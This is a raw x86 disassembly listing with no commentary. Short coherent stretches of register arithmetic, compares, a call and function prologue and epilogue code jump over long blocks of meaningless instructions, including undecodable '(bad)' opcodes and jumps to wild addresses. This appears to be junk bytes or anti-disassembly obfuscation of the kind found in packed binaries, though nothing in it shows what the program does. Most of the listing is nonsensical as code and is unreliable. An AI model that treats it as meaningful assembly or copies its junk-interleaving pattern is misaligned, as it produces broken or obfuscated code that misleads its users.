  40f11d:	cmp    DWORD PTR [ecx+0x53c87dfa],edi
  40f123:	call   0x4202:0x553203c0
  40f12a:	dec    edx
  40f12b:	and    eax,edx
  40f12d:	cdq    
  40f12e:	dec    ecx
  40f12f:	cmp    DWORD PTR [esi],0x639691c0
  40f135:	dec    ebp
  40f136:	pop    ebx
  40f137:	in     eax,dx
  40f138:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f139:	dec    edx
  40f13a:	arpl   WORD PTR [ebx+0x54333a47],ax
  40f140:	pop    eax
  40f141:	xchg   edx,eax
  40f143:	sub    al,0x51
  40f145:	adc    eax,esi
  40f147:	int    0xe
  40f149:	nop
  40f14a:	mov    al,ds:0x26802665
  40f14f:	in     eax,dx
  40f150:	adc    bh,BYTE PTR [eax+ebp*8+0xf]
  40f154:	test   BYTE PTR [eax+0x1],bh
  40f157:	add    BYTE PTR [eax],al
  40f159:	mov    eax,DWORD PTR [ebp-0x8]
  40f15c:	jmp    0x40f2c6
  40f161:	lods   eax,DWORD PTR ds:[esi]
  40f162:	ret    0xcc29
  40f165:	jno    0x40f15a
  40f167:	ins    DWORD PTR es:[edi],dx
  40f168:	popa   
  40f169:	fdivr  DWORD PTR [ecx]
  40f16b:	xchg   ecx,eax
  40f16c:	test   DWORD PTR [eax],ecx
  40f16e:	sub    ah,ch
  40f170:	in     eax,0xa3
  40f172:	stos   BYTE PTR es:[edi],al
  40f173:	jo     0x40f1e5
  40f175:	ret    
  40f176:	jg     0x40f1e8
  40f178:	jo     0x40f102
  40f17a:	daa    
  40f17b:	xchg   ebp,eax
  40f17c:	repz jl 0x40f1ca
  40f17f:	pop    esi
  40f180:	sub    ah,BYTE PTR [edi+0x1a4f8258]
  40f186:	fldcw  WORD PTR [edx]
  40f188:	add    al,0xe7
  40f18a:	outs   dx,BYTE PTR ds:[esi]
  40f18b:	sub    BYTE PTR [ebp-0x66],ah
  40f18e:	xor    eax,0x477c25e3
  40f193:	aad    0xf6
  40f195:	fistp  WORD PTR [edi+0x2c88ceb3]
  40f19b:	ins    BYTE PTR es:[edi],dx
  40f19c:	adc    al,0x63
  40f19e:	jmp    0x2498:0xba4c010f
  40f1a5:	dec    ebx
  40f1a6:	push   0x51
  40f1a8:	imul   ebp,DWORD PTR [ebp+0x11],0x6fb856cd
  40f1af:	aad    0xae
  40f1b1:	and    al,0xe6
  40f1b3:	inc    eax
  40f1b4:	enter  0xc81b,0xc7
  40f1b8:	inc    ebx
  40f1b9:	add    WORD PTR [ebp+0x6],bp
  40f1bd:	push   0xfffffff2
  40f1bf:	pop    eax
  40f1c0:	and    al,0x2c
  40f1c2:	mov    ebp,0xd62ae671
  40f1c7:	jp     0x40f1a1
  40f1c9:	int    0xcd
  40f1cb:	fnop   
  40f1cd:	pop    edi
  40f1ce:	xor    al,BYTE PTR [esi]
  40f1d0:	or     bl,BYTE PTR [ebx-0x43]
  40f1d3:	ins    DWORD PTR es:[edi],dx
  40f1d4:	jmp    0x44854bfb
  40f1d9:	cdq    
  40f1da:	out    0x29,eax
  40f1dc:	xchg   edx,eax
  40f1dd:	or     BYTE PTR [edx-0x77],cl
  40f1e0:	lahf   
  40f1e1:	in     eax,0x12
  40f1e3:	sub    al,0x3b
  40f1e5:	jbe    0x40f21a
  40f1e7:	(bad)  
  40f1e8:	(bad)  
  40f1e9:	mov    cl,0xec
  40f1eb:	cli    
  40f1ec:	push   esp
  40f1ed:	(bad)  
  40f1ee:	fidivr WORD PTR [edx+0x34]
  40f1f1:	js     0x40f243
  40f1f3:	fiadd  WORD PTR gs:[ebp-0x2e855b18]
  40f1fa:	adc    bl,ch
  40f1fc:	xor    DWORD PTR [ecx+0x34],esi
  40f1ff:	and    al,0xd1
  40f201:	mov    ds:0x67b197f4,eax
  40f206:	jmp    0x9267e6bc
  40f20b:	xor    dl,dh
  40f20d:	or     esi,DWORD PTR [esi]
  40f20f:	pop    edx
  40f210:	outs   dx,DWORD PTR ds:[esi]
  40f211:	in     eax,dx
  40f212:	jns    0x40f1bf
  40f214:	xlat   BYTE PTR ds:[ebx]
  40f215:	retf   
  40f216:	jge    0x40f1b0
  40f218:	and    DWORD PTR [eax+0x20],0xdb7e6bdd
  40f21f:	xor    eax,0xf35f34ed
  40f224:	push   esi
  40f225:	mov    esp,0xb8abcb64
  40f22a:	sbb    DWORD PTR ds:0x7b2e5884,eax
  40f230:	jnp    0x40f20b
  40f232:	sub    eax,0x7a03d916
  40f237:	repz and BYTE PTR [bp+di+0x66],ah
  40f23c:	call   0x9f18ebc
  40f241:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f242:	jae    0x40f1f1
  40f244:	popf   
  40f245:	ins    DWORD PTR es:[edi],dx
  40f246:	(bad)  
  40f248:	mov    ah,0x4
  40f24a:	mov    ecx,0x9f81738a
  40f24f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f250:	inc    ebx
  40f251:	aaa    
  40f252:	shl    DWORD PTR [edx-0x3a5f04ea],0xec
  40f259:	mov    bl,BYTE PTR [eax]
  40f25b:	icebp  
  40f25c:	or     bl,BYTE PTR [eax-0x62b4bbc9]
  40f262:	pop    es
  40f263:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f264:	xchg   ecx,eax
  40f265:	(bad)
  40f269:	outs   dx,BYTE PTR ds:[esi]
  40f26a:	stos   BYTE PTR es:[edi],al
  40f26b:	pushf  
  40f26c:	push   ds
  40f26d:	pusha  
  40f26e:	int3   
  40f26f:	and    BYTE PTR es:[ebx-0x21],0xa2
  40f274:	xchg   ecx,eax
  40f275:	fimul  DWORD PTR [eax-0x50]
  40f278:	or     edi,DWORD PTR ds:0x4f3b259b
  40f27e:	inc    ebx
  40f27f:	iret   
  40f280:	and    BYTE PTR [esi+0x534e4fa],dh
  40f286:	jl     0x40f22c
  40f288:	retf   0x6ec1
  40f28b:	nop    ebp
  40f28e:	jne    0x40f242
  40f290:	loope  0x40f245
  40f292:	push   0x6a
  40f294:	fst    QWORD PTR [ebp-0x61e9e2a2]
  40f29a:	or     eax,0x80adf192
  40f29f:	sub    eax,0xd0e83efa
  40f2a4:	stos   BYTE PTR es:[edi],al
  40f2a5:	cmp    eax,0x62bef536
  40f2aa:	push   0xf98d24f2
  40f2af:	pop    esp
  40f2b0:	mov    edx,0x8486770d
  40f2b5:	dec    edx
  40f2b6:	rcl    BYTE PTR [ecx],cl
  40f2b8:	test   eax,0x7d884c
  40f2bd:	mov    al,0xf6
  40f2bf:	add    DWORD PTR [edx],ecx
  40f2c1:	fsubrp st(3),st
  40f2c3:	xchg   esi,eax
  40f2c4:	scas   eax,DWORD PTR es:[edi]
  40f2c5:	jecxz  0x40f28e
  40f2c7:	add    BYTE PTR [ecx-0x169fcbe2],cl
  40f2cd:	in     eax,0x4
  40f2cf:	add    BYTE PTR [eax],al
  40f2d1:	mov    eax,DWORD PTR [ebp+0x8]
  40f2d4:	mov    ecx,DWORD PTR [ebp-0x8]
  40f2d7:	xor    eax,esi
  40f2d9:	add    eax,edi
  40f2db:	cmp    DWORD PTR [ecx],eax
  40f2dd:	je     0x40f79e
  40f2e3:	mov    ecx,DWORD PTR [ebp-0x18]
  40f2e6:	jmp    0x40f450
  40f2eb:	dec    ebx
  40f2ec:	int3   
  40f2ed:	cmp    esi,ecx
  40f2ef:	mov    ecx,0x99494bcd
  40f2f4:	add    dh,ch
  40f2f6:	rcr    BYTE PTR ds:0x76467782,1
  40f2fc:	test   eax,0x7fc37070
  40f301:	jo     0x40f373
  40f303:	imul   eax,ecx,0x94f61122
  40f309:	cmp    edi,DWORD PTR [ecx-0x26dc9a1d]
  40f30f:	jmp    0x7bc40be8
  40f314:	xor    ebp,DWORD PTR [edi]
  40f316:	retf   
  40f317:	pushf  
  40f318:	(bad)  
  40f319:	fcom   st(1)
  40f31b:	xchg   edx,eax
  40f31c:	adc    al,BYTE PTR [esi-0x4]
  40f31f:	in     eax,dx
  40f320:	bound  edx,QWORD PTR [edx+edi*1-0xe]
  40f324:	cmp    DWORD PTR [ecx+0x484ec86b],0x171bbecf
  40f32e:	shl    BYTE PTR [ecx],cl
  40f330:	adc    edx,ecx
  40f332:	outs   dx,DWORD PTR ds:[esi]
  40f333:	(bad)  [esi+0x67ce4dd8]
  40f339:	clc    
  40f33a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f33b:	xchg   ebx,eax
  40f33c:	mov    eax,ds:0xbe260f9
  40f341:	mov    dh,0x4
  40f343:	jo     0x40f367
  40f345:	inc    esp
  40f346:	arpl   WORD PTR [edi],cx
  40f348:	arpl   dx,si
  40f34a:	repnz in eax,dx
  40f34c:	pop    ebx
  40f34d:	adc    al,0xb3
  40f34f:	pop    ss
  40f350:	packsswb mm2,QWORD PTR cs:[eax+ecx*2+0x59]
  40f356:	jp     0x40f314
  40f358:	sbb    eax,0xa21a3c78
  40f35d:	mov    edx,DWORD PTR es:[edx]
  40f360:	add    al,0xee
  40f362:	fisttp DWORD PTR ds:0x698a4d3e
  40f368:	cwde   
  40f369:	xor    esi,DWORD PTR [edi]
  40f36b:	jne    0x40f355
  40f36d:	pop    ebp
  40f36e:	xor    al,0x2
  40f370:	fnstsw WORD PTR [edx+0x53]
  40f373:	inc    edi
  40f374:	add    cl,0x51
  40f377:	and    BYTE PTR [ecx],bh
  40f379:	and    ah,BYTE PTR [edi+0x1dcfad08]
  40f37f:	or     cl,BYTE PTR [edx]
  40f381:	mov    al,ds:0x48624da9
  40f386:	jb     0x40f340
  40f388:	sub    BYTE PTR [eax-0x3],bh
  40f38b:	popf   
  40f38c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f38d:	sub    BYTE PTR [ebp+0x2d6c3df0],cl
  40f393:	cdq    
  40f394:	addr16 push edi
  40f396:	aas    
  40f397:	repz aaa 
  40f399:	add    eax,0xfa269bdc
  40f39e:	fild   QWORD PTR [ebx]
  40f3a0:	cs push 0x76
  40f3a3:	cmp    dh,BYTE PTR [edi]
  40f3a5:	and    ecx,DWORD PTR [ebx-0x3e81af43]
  40f3ab:	lods   al,BYTE PTR ds:[esi]
  40f3ac:	xchg   edi,eax
  40f3ad:	sbb    DWORD PTR [edi+eax*4],ebp
  40f3b0:	iret   
  40f3b1:	aad    0x0
  40f3b3:	mov    bl,0x32
  40f3b5:	popa   
  40f3b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f3b7:	ds sbb al,0x5a
  40f3ba:	ret    0xf44d
  40f3bd:	cld    
  40f3be:	in     eax,0xe4
  40f3c0:	jae    0x40f413
  40f3c2:	and    al,0xc9
  40f3c4:	fmul   st,st(2)
  40f3c6:	fsub   DWORD PTR [ebp-0x2c]
  40f3c9:	ds add eax,0x6f5d0831
  40f3cf:	xchg   ecx,eax
  40f3d0:	test   DWORD PTR [edx+0x37],esi
  40f3d3:	outs   dx,BYTE PTR ds:[esi]
  40f3d4:	adc    al,0x47
  40f3d6:	sbb    edi,DWORD PTR [ebp+0x307d74c6]
  40f3dc:	adc    cl,BYTE PTR [esp+edi*1-0x97f7a8d]
  40f3e3:	push   esp
  40f3e4:	in     al,dx
  40f3e5:	push   edi
  40f3e6:	test   eax,0x4fb0fd0
  40f3eb:	fst    st(7)
  40f3ed:	mov    ds:0x99f60859,al
  40f3f2:	scas   al,BYTE PTR es:[edi]
  40f3f3:	adc    BYTE PTR [eax-0x33d69222],0xd
  40f3fa:	ret    
  40f3fb:	lahf   
  40f3fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f3fd:	sti    
  40f3fe:	sahf   
  40f3ff:	push   esp
  40f400:	add    eax,0x74ce4203
  40f405:	in     eax,dx
  40f406:	fisub  WORD PTR [edx+0x18de58e9]
  40f40c:	mov    ecx,0x5b04e6cb
  40f411:	mov    bh,bl
  40f413:	stos   DWORD PTR es:[edi],eax
  40f414:	xchg   ebx,eax
  40f415:	out    dx,al
  40f416:	xchg   ecx,eax
  40f417:	and    BYTE PTR [eax],dh
  40f419:	das    
  40f41a:	sub    BYTE PTR [eax+0x5c],cl
  40f41d:	mov    dh,0x36
  40f41f:	mov    cl,0x51
  40f421:	xor    cl,BYTE PTR [esi+0x6e401213]
  40f427:	dec    esp
  40f428:	or     DWORD PTR [edx],esi
  40f42a:	mov    ebx,esi
  40f42c:	and    ch,BYTE PTR [eax-0x7ea0c986]
  40f432:	or     BYTE PTR [ebp+ecx*2+0x330b04bc],ah
  40f439:	xor    al,0xa6
  40f43b:	rcr    BYTE PTR [esi+0x4b9b0095],cl
  40f441:	addr16 or bl,bl
  40f444:	shr    BYTE PTR [ecx+0x204b3c2a],1
  40f44a:	out    0xc0,eax
  40f44c:	pop    eax
  40f44d:	lahf   
  40f44e:	push   esp
  40f44f:	pop    ebp
  40f450:	mov    eax,DWORD PTR [ebp-0x8]
  40f453:	jmp    0x40f5bd
  40f458:	inc    eax
  40f459:	gs ror ch,cl
  40f45c:	icebp  
  40f45d:	imul   edx,DWORD PTR [ebx+0x65],0x2966c4cb
  40f464:	jnp    0x40f454
  40f466:	pop    es
  40f467:	xor    bh,BYTE PTR [ecx]
  40f469:	mov    bh,0x70
  40f46b:	jo     0x40f430
  40f46d:	jg     0x40f4df
  40f46f:	jo     0x40f4a1
  40f471:	jmp    0x40f4d6
  40f473:	inc    edi
  40f474:	(bad)  
  40f475:	pusha  
  40f476:	xor    ebx,DWORD PTR [edx-0x1bcfd8e5]
  40f47c:	sub    eax,0x333c7e8a
  40f481:	adc    ecx,DWORD PTR [edx]
  40f483:	js     0x40f462
  40f485:	je     0x40f48f
  40f487:	mov    dh,0xf5
  40f489:	repz or bh,al
  40f48c:	and    dh,0x58
  40f48f:	retf   0x6dc4
  40f492:	dec    edi
  40f493:	push   DWORD PTR [edx-0x56]
  40f496:	push   eax
  40f497:	loop   0x40f449
  40f499:	sub    BYTE PTR [ecx-0x1c],dh
  40f49c:	outs   dx,BYTE PTR ds:[esi]
  40f49d:	jecxz  0x40f4aa
  40f49f:	aaa    
  40f4a0:	call   0xd5d3a1e6
  40f4a5:	adc    DWORD PTR [edx],edi
  40f4a7:	push   0xffffffd6
  40f4a9:	inc    edi
  40f4aa:	pop    esp
  40f4ab:	cmp    BYTE PTR [edi+0x33],dh
  40f4ae:	push   ss
  40f4af:	push   ebx
  40f4b0:	cmp    al,0x2c
  40f4b2:	popf   
  40f4b3:	sub    al,0x24
  40f4b5:	push   cs
  40f4b6:	jae    0x40f4ca
  40f4b8:	adc    eax,0xe7b225a0
  40f4bd:	jmp    0x40f475
  40f4bf:	push   ds
  40f4c0:	cmp    edi,DWORD PTR [esi]
  40f4c2:	in     eax,0x15
  40f4c4:	or     bh,BYTE PTR [esi+0x20]
  40f4c7:	cmp    dl,BYTE PTR [edx+0x37]
  40f4ca:	adc    BYTE PTR [ebp-0x20],cl
  40f4cd:	pop    esp
  40f4ce:	inc    esi
  40f4cf:	outs   dx,DWORD PTR ds:[esi]
  40f4d0:	das    
  40f4d1:	jmp    0x4b38f086
  40f4d6:	jle    0x40f4aa
  40f4d8:	sbb    eax,DWORD PTR [edx+ecx*1]
  40f4db:	and    ebx,ebp
  40f4dd:	mov    cs,ecx
  40f4df:	lahf   
  40f4e0:	inc    esp
  40f4e1:	sti    
  40f4e2:	add    dl,BYTE PTR [edi+ebx*4]
  40f4e5:	adc    esi,edx
  40f4e7:	aad    0xa1
  40f4e9:	retf   
  40f4ea:	jmp    0x40f4a4
  40f4ec:	jmp    0xee60:0x6118abd5
  40f4f3:	in     eax,dx
  40f4f4:	dec    edi
  40f4f5:	mov    dl,0x28
  40f4f7:	jbe    0x40f49c
  40f4f9:	imul   ebx,ecx,0x46ef1783
  40f4ff:	loopne 0x40f4f8
  40f501:	add    esi,DWORD PTR ds:0xf9f74033
  40f507:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f508:	sbb    edx,DWORD PTR [edi-0x161a4fc2]
  40f50e:	sub    eax,0x5e10192b
  40f513:	aad    0x43
  40f515:	xor    esp,DWORD PTR [edx-0x16]
  40f518:	cmc    
  40f519:	jp     0x40f4b2
  40f51b:	repz mov edi,0xc8ad405e
  40f521:	lea    edi,ds:0xb2ebf31
  40f527:	sahf   
  40f528:	mov    ds:0xec3c48b5,eax
  40f52d:	jmp    DWORD PTR [ebx+0x498f259d]
  40f533:	retf   0x8837
  40f536:	repz add edx,DWORD PTR [eax+0x75]
  40f53a:	fucomip st,st(6)
  40f53c:	rcl    BYTE PTR [ebx+0x4fdce1b1],1
  40f542:	fdivr  DWORD PTR [esi+0x47]
  40f545:	cwde   
  40f546:	cmp    eax,0xc08e17b2
  40f54b:	shl    DWORD PTR [ecx+0x5],1
  40f54e:	fwait
  40f54f:	fs xor al,0xef
  40f552:	int    0xfd
  40f554:	jmp    0x40f5cb
  40f556:	push   edi
  40f557:	or     DWORD PTR [esi-0x24],ebx
  40f55a:	lods   al,BYTE PTR ds:[esi]
  40f55b:	sub    DWORD PTR [ebp+0x4878fe25],esi
  40f561:	aas    
  40f562:	sub    al,al
  40f564:	ins    BYTE PTR es:[edi],dx
  40f565:	adc    ah,dl
  40f567:	xchg   edx,eax
  40f568:	sbb    eax,0x115faa08
  40f56d:	push   0x5f
  40f56f:	mov    ss,WORD PTR [edi-0x52d5b682]
  40f575:	mov    al,ds:0x52d90e8
  40f57a:	iret   
  40f57b:	pop    ebp
  40f57c:	dec    ebp
  40f57d:	dec    ebx
  40f57e:	lods   al,BYTE PTR ds:[esi]
  40f57f:	mov    eax,ds:0xedc2aae2
  40f584:	lods   al,BYTE PTR ds:[esi]
  40f585:	add    BYTE PTR [edx],0x83
  40f588:	out    dx,eax
  40f589:	inc    ebp
  40f58a:	popf   
  40f58b:	xchg   edx,eax
  40f58c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f58d:	push   edx
  40f58e:	lods   eax,DWORD PTR ds:[esi]
  40f58f:	popa   
  40f590:	repnz xchg esp,eax
  40f592:	aad    0xab
  40f594:	or     edi,esp
  40f596:	rcl    esi,1
  40f598:	frstor [ebx-0xc]
  40f59b:	pop    es
  40f59c:	add    ebx,ebp
  40f59e:	xor    ah,0x92
  40f5a1:	lds    esi,FWORD PTR [ecx]
  40f5a3:	loop   0x40f54e
  40f5a5:	inc    edx
  40f5a6:	push   esp
  40f5a7:	inc    edi
  40f5a8:	inc    ecx
  40f5a9:	jle    0x40f598
  40f5ab:	stc    
  40f5ac:	hlt    
  40f5ad:	lock hlt 
  40f5af:	stos   BYTE PTR es:[edi],al
  40f5b0:	dec    edi
  40f5b1:	(bad)  
  40f5b2:	jg     0x40f58b
  40f5b4:	xchg   DWORD PTR [esi-0x33382ce7],ebx
  40f5ba:	xor    BYTE PTR [ebx-0x74ff7403],al
  40f5c0:	inc    eax
  40f5c1:	cmp    al,0x8d
  40f5c3:	or     al,0xcd
  40f5c5:	js     0x40f5c7
  40f5c7:	add    BYTE PTR [eax],al
  40f5c9:	add    eax,ecx
  40f5cb:	mov    ecx,DWORD PTR [ebp-0x8]
  40f5ce:	mov    ecx,DWORD PTR [ecx]
  40f5d0:	mov    eax,DWORD PTR [eax+ecx*1]
  40f5d3:	mov    DWORD PTR [ebp-0x20],eax
  40f5d6:	mov    eax,DWORD PTR [ebp+0x8]
  40f5d9:	xor    eax,esi
  40f5db:	add    eax,edi
  40f5dd:	mov    DWORD PTR [ebp-0x24],eax
  40f5e0:	mov    eax,DWORD PTR [ebp+0x8]
  40f5e3:	mov    ecx,DWORD PTR [ebp-0x20]
  40f5e6:	xor    eax,esi
  40f5e8:	add    eax,edi
  40f5ea:	cmp    ecx,eax
  40f5ec:	je     0x40f7b6
  40f5f2:	jmp    0x40f75c
  40f5f7:	pop    ebx
  40f5f8:	out    dx,al
  40f5f9:	dec    ebp
  40f5fa:	mov    bl,0x49
  40f5fc:	mov    bl,0x61
  40f5fe:	test   BYTE PTR [edx+0xc],0x5a
  40f602:	dec    ebx
  40f603:	jg     0x40f5bf
  40f605:	mov    ah,0x9d
  40f607:	mov    WORD PTR [esi+0x7fc37070],?
  40f60d:	jo     0x40f67f
  40f60f:	xor    eax,0x65043662
  40f614:	jmp    0x4b491841
  40f619:	ins    BYTE PTR es:[edi],dx
  40f61a:	shl    DWORD PTR [ebp-0x46c07c87],0x7
  40f621:	cmp    DWORD PTR [ebx-0x56],ebx
  40f624:	xchg   edx,eax
  40f625:	mov    esp,DWORD PTR ss:[esi]
  40f628:	sub    eax,0xeb0a930
  40f62d:	and    al,0xc3
  40f62f:	scas   al,BYTE PTR es:[edi]
  40f630:	xchg   ecx,eax
  40f631:	mov    al,ds:0x2898fdec
  40f636:	inc    ecx
  40f637:	dec    edx
  40f638:	mov    ds:0xfb1f6501,eax
  40f63d:	sbb    BYTE PTR ds:0xc4de11b7,dh
  40f643:	repnz out dx,al
  40f645:	push   cs
  40f646:	pop    esi
  40f647:	dec    BYTE PTR [ebx+0x27]
  40f64a:	sub    bh,bl
  40f64c:	sbb    al,0x52
  40f64e:	mov    ecx,0xd861a50b
  40f653:	hlt    
  40f654:	daa    
  40f655:	pop    edx
  40f656:	test   al,0xc
  40f658:	aam    0x67
  40f65a:	fwait
  40f65b:	test   BYTE PTR [eax-0x56a6c022],bl
  40f661:	push   ebx
  40f662:	jecxz  0x40f64d
  40f664:	jp     0x40f654
  40f666:	ror    DWORD PTR [ecx-0x613cf30c],cl
  40f66c:	loope  0x40f656
  40f66e:	mov    edi,0xf82dec79
  40f673:	dec    esp
  40f674:	lock int3 
  40f676:	push   edx
  40f677:	ficomp DWORD PTR [edx-0x23]
  40f67a:	in     eax,dx
  40f67b:	test   edx,ecx
  40f67d:	shl    BYTE PTR [ecx+0x7c268da],0x93
  40f684:	cmp    eax,0xb024cca8
  40f689:	sar    DWORD PTR [eax-0x7aedb3d4],0x32
  40f690:	mov    al,ds:0xda762e6e
  40f695:	dec    ecx
  40f696:	lds    ecx,FWORD PTR [esi]
  40f698:	enter  0x76c5,0x9c
  40f69c:	xchg   edx,eax
  40f69d:	mov    dl,BYTE PTR [edx]
  40f69f:	inc    ebx
  40f6a0:	loopne 0x40f69a
  40f6a2:	ins    DWORD PTR es:[edi],dx
  40f6a3:	pop    eax
  40f6a4:	repz mov esp,0x58449cb
  40f6aa:	test   al,0x4e
  40f6ac:	mov    DWORD PTR [eax+0x4dcc01d4],0x37330fd6
  40f6b6:	mov    ch,0x7e
  40f6b8:	push   ds
  40f6b9:	dec    edi
  40f6ba:	loopne 0x40f670
  40f6bc:	in     eax,dx
  40f6bd:	mov    dl,0x7d
  40f6bf:	jmp    0x59e61d3e
  40f6c4:	push   0x39
  40f6c6:	pop    esi
  40f6c7:	pop    ebp
  40f6c8:	cmc    
  40f6c9:	fimul  WORD PTR [edi+ebx*1+0x1a39cade]
  40f6d0:	out    0xb8,eax
  40f6d2:	mov    esp,0x8d2e6d0
  40f6d7:	add    ch,0xde
  40f6da:	push   ss
  40f6db:	add    ch,0xaf
  40f6de:	lods   al,BYTE PTR ds:[esi]
  40f6df:	fbld   TBYTE PTR [ecx]
  40f6e1:	out    0x5a,al
  40f6e3:	mov    DWORD PTR [esi+0x38ed1f0c],edx
  40f6e9:	ins    DWORD PTR es:[edi],dx
  40f6ea:	es pop ebx
  40f6ec:	mov    ch,0x73
  40f6ee:	enter  0x8da7,0xad
  40f6f2:	pop    ds
  40f6f3:	dec    ebx
  40f6f4:	jnp    0x40f747
  40f6f6:	mov    si,gs
  40f6f9:	popa   
  40f6fa:	push   0x2f
  40f6fc:	fs aam 0x9f
  40f6ff:	inc    ebp
  40f700:	dec    edx
  40f701:	or     esp,DWORD PTR [edi-0x972f6c5]
  40f707:	iret   
  40f708:	fst    DWORD PTR [edx]
  40f70a:	push   cs
  40f70b:	cmp    BYTE PTR [ecx],cl
  40f70d:	ds xor al,0xf6
  40f710:	pop    ecx
  40f711:	int3   
  40f712:	out    0x46,eax
  40f714:	das    
  40f715:	sbb    eax,0x5e1d8736
  40f71a:	xchg   BYTE PTR [edx],ah
  40f71c:	push   edx
  40f71d:	pop    ebp
  40f71e:	sub    al,0x1c
  40f720:	dec    esp
  40f721:	mov    esi,DWORD PTR [ecx-0x10d91d6a]
  40f727:	add    dl,BYTE PTR [ecx]
  40f729:	fadd   st,st(3)
  40f72b:	femms  
  40f72d:	aas    
  40f72e:	cmc    
  40f72f:	push   edi
  40f730:	or     esi,esi
  40f732:	mov    dl,0xae
  40f734:	adc    esi,0x4
  40f737:	pop    ecx
  40f738:	sbb    eax,0x705f8af2
  40f73d:	int3   
  40f73e:	jecxz  0x40f70b
  40f740:	xor    eax,0xa45b2040
  40f745:	outs   dx,BYTE PTR ds:[esi]
  40f746:	fwait
  40f747:	dec    ah
  40f749:	pop    eax
  40f74a:	mov    ecx,DWORD PTR [ecx]
  40f74c:	xor    bh,BYTE PTR [esi-0x6c]
  40f74f:	sub    BYTE PTR [ebp+0x16],dl
  40f752:	sub    BYTE PTR [edi+0x50],ah
  40f755:	mov    edi,0xdee18c5d
  40f75a:	(bad)  
  40f75b:	sub    ecx,DWORD PTR [ebx+0x4d8bf845]
  40f761:	loopne 0x40f766
  40f763:	or     BYTE PTR [ecx+0x458bdc4d],cl
  40f769:	fmul   QWORD PTR [ebx+0x408bf84d]
  40f76f:	or     al,0x8b
  40f771:	or     DWORD PTR [edx+0x37040804],ecx
  40f777:	xor    al,0x47
  40f779:	cmp    al,0xc5
  40f77b:	je     0x40f792
  40f781:	mov    eax,DWORD PTR [ebp+0x8]
  40f784:	mov    ecx,DWORD PTR [ebp-0x8]
  40f787:	xor    eax,esi
  40f789:	add    eax,edi
  40f78b:	mov    DWORD PTR [ecx],eax
  40f78d:	jmp    0x40f7b6
  40f792:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  40f799:	jmp    0x40f7b6
  40f79e:	mov    eax,DWORD PTR [ebp-0x8]
  40f7a1:	mov    ecx,DWORD PTR [ebp-0x1c]
  40f7a4:	mov    ecx,DWORD PTR [ecx]
  40f7a6:	mov    DWORD PTR [eax],ecx
  40f7a8:	mov    eax,DWORD PTR [ebp+0xc]
  40f7ab:	mov    eax,DWORD PTR [ebp+0x8]
  40f7ae:	push   DWORD PTR [ebp-0x8]
  40f7b1:	call   0x401000
  40f7b6:	mov    eax,DWORD PTR [ebp-0xc]
  40f7b9:	cmp    eax,ebx
  40f7bb:	je     0x40e863
  40f7c1:	mov    eax,DWORD PTR [ebp-0x8]
  40f7c4:	mov    eax,DWORD PTR [eax]
  40f7c6:	pop    edi
  40f7c7:	pop    esi
  40f7c8:	pop    ebx
  40f7c9:	leave  
  40f7ca:	ret    0x8
  40f7cd:	push   ebp
  40f7ce:	mov    ebp,esp
  40f7d0:	jmp    0x40fb9a
  40f7d5:	ds cmp al,0x79
  40f7d8:	adc    BYTE PTR [ecx-0x23],bh
  40f7db:	(bad)  
  40f7dd:	dec    ebp
  40f7de:	xor    eax,0x38e146f3
  40f7e3:	aam    0x60
  40f7e5:	pop    edi
  40f7e6:	mov    ch,0x70
  40f7e8:	jo     0x40f78d
  40f7ea:	jge    0x40f85c
  40f7ec:	jo     0x40f785
  40f7ee:	int3   
  40f7ef:	retf   
  40f7f0:	stos   BYTE PTR es:[edi],al
  40f7f1:	call   0x836fe7f2
  40f7f6:	pusha  
  40f7f7:	into   
  40f7f8:	xor    DWORD PTR [edx+0x22],ebp
  40f7fb:	aad    0xf8
  40f7fd:	out    dx,al
  40f7fe:	inc    edx
  40f7ff:	mov    al,0xa3
  40f801:	mov    esi,0x5aed9b9c
  40f806:	loopne 0x40f7b1
  40f808:	xor    DWORD PTR [esi],0xffffffda
  40f80b:	mov    dh,0xde
  40f80d:	or     eax,DWORD PTR [edx]
  40f80f:	sbb    al,0xa3
  40f811:	mov    al,0x1d
  40f813:	adc    esi,DWORD PTR [edx+0x2d]
  40f816:	mov    cl,0x6f
  40f818:	sub    edi,DWORD PTR [ebx+0x4f]
  40f81b:	cmp    dl,BYTE PTR [eax+0x36931056]
  40f821:	in     eax,dx
  40f822:	mov    esi,DWORD PTR [ebx+0x59]
  40f825:	adc    ecx,DWORD PTR [edx]
  40f827:	shl    BYTE PTR [esi+0x5f],1
  40f82a:	ficomp DWORD PTR [ebp-0x3fe2c511]
  40f830:	jne    0x40f8a2
  40f832:	sbb    ecx,0x45
  40f835:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f836:	fnstcw WORD PTR [ebx-0x3d]
  40f839:	aad    0x2f
  40f83b:	lea    ebp,[ecx+0x3e2866d4]
  40f841:	mov    BYTE PTR [ecx+0xf06883f],bh
  40f847:	ss jl  0x40f8a1
  40f84a:	adc    DWORD PTR [esi+0x7295c8c0],ecx
  40f850:	aam    0x9e
  40f852:	test   DWORD PTR [ecx+0x38],ebx
  40f855:	push   cs
  40f856:	push   edi
  40f857:	adc    eax,0x6d09d28b
  40f85c:	inc    eax
  40f85d:	pop    es
  40f85e:	das    
  40f85f:	pop    ds
  40f860:	in     eax,0xcf
  40f862:	inc    esi
  40f863:	fstp   DWORD PTR cs:[ecx]
  40f866:	retf   
  40f867:	dec    BYTE PTR [edi+0x9834f2b]
  40f86d:	bound  esi,QWORD PTR ds:0xa4441afa
  40f873:	or     eax,0x1877357c
  40f878:	lods   eax,DWORD PTR ds:[esi]
  40f879:	pop    ebp
  40f87a:	ret    
  40f87b:	call   0xab7b7c1c
  40f880:	int    0xdb
  40f882:	or     ecx,esp
  40f884:	nop
  40f885:	js     0x40f861
  40f887:	retf   0xd68c
  40f88a:	fbld   TBYTE PTR [eax-0x2c870dc]
  40f890:	and    di,di
  40f893:	jae    0x40f850
  40f895:	jmp    0x40f8b9
